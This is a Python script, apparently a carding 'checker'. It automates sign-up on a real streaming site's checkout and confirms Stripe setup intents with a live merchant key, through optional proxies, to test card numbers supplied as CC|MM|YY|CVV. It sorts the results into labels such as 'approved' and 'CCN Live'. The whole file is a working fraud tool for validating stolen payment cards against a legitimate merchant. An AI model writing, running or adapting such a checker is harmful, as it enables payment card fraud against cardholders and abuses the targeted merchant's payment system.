import requests
import re
from faker import Faker

faker = Faker()

def parse(text, a, b):
    return text.split(a)[1].split(b)[0]

def run(card, proxy_input=None):
    try:
        cc, mes, ano, cvv = card.split('|')
    except:
        return {'status': 'declined', 'message': 'Invalid card format (must be CC|MM|YY|CVV)'}

    session = requests.Session()
    if proxy_input:
        proxy_url = f"http://{proxy_input}"
        session.proxies.update({
            'http': proxy_url,
            'https': proxy_url
        })

    try:
        session.post(
            "https://www.tmilly.tv/checkout/submit_form_sign_up",
            params={"o": "32247"},
            headers={
                "accept": "text/html",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0"
            },
            data="form%5Bemail%5D=test@mail.com&form%5Bname%5D=Tester&form%5Bterms_and_conditions%5D=on"
        )

        r = session.get("https://www.tmilly.tv/api/billings/setup_intent", params={"page": "checkouts"})
        setup_intent = r.json().get("setup_intent", "")
        if not setup_intent:
            return {"status": "error", "message": "Failed to retrieve setup intent"}
        seti_id = setup_intent.split("_secret_")[0]

        payload = (
            f'return_url=https://www.tmilly.tv/checkout/success'
            f'&payment_method_data[type]=card'
            f'&payment_method_data[card][number]={cc}'
            f'&payment_method_data[card][cvc]={cvv}'
            f'&payment_method_data[card][exp_year]={ano}'
            f'&payment_method_data[card][exp_month]={mes}'
            f'&payment_method_data[billing_details][address][country]=US'
            f'&_stripe_account=acct_1FawFBC0yx1905mY'
            f'&key=pk_live_DImPqz7QOOyx70XCA9DSifxb'
            f'&client_secret={setup_intent}'
        )

        res = session.post(
            f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
            headers={
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0"
            },
            data=payload
        )

        if res.status_code == 200 and res.json().get("status") == "succeeded":
            return {"status": "approved", "message": "Charged Successfully ✅"}

        if "next_action" in res.json():
            return {"status": "3ds", "message": "3D Secure Required ⚠️"}

        error = res.json().get("error", {})
        code = error.get("code", "")
        message = error.get("message", "Card Declined ❌")

        stripe_messages = {
            "card_declined": "Card Declined ❌",
            "incorrect_cvc": "CCN Live - Incorrect CVC ⚠️",
            "expired_card": "Expired Card ❌",
            "insufficient_funds": "Insufficient Funds ❎",
            "lost_card": "Lost Card ❌",
            "stolen_card": "Stolen Card ❌",
            "do_not_honor": "Do Not Honor ❌",
            "pickup_card": "Pickup Card ❌",
            "fraudulent": "Fraudulent ❌",
            "processing_error": "Processing Error ⚠️",
            "incorrect_number": "Incorrect Card Number ❌",
            "authentication_required": "3D Secure Required ⚠️"
        }

        return {
            "status": "declined",
            "code": code,
            "message": stripe_messages.get(code, message)
        }

    except Exception as e:
        return {"status": "error", "message": str(e)}
